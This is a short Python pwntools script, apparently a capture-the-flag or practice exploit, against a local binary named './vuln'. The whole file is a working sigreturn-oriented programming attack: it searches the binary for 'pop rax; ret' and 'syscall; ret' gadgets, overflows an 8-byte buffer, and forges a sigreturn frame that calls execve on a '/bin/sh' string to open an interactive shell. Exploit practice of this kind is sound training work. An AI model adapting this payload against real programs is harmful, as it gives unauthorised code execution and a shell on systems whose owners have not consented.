#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

binsh = elf.address + 0x1430

POP_RAX = next(elf.search(asm('pop rax; ret')))
SYSCALL = next(elf.search(asm('syscall; ret')))

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = binsh
frame.rsi = 0x0
frame.rdx = 0x0
frame.rip = SYSCALL

offset = 8

payload = flat(
    b'A' * offset,
    POP_RAX,
    0xf,
    SYSCALL,
    frame
)

p.sendline(payload)

p.interactive()
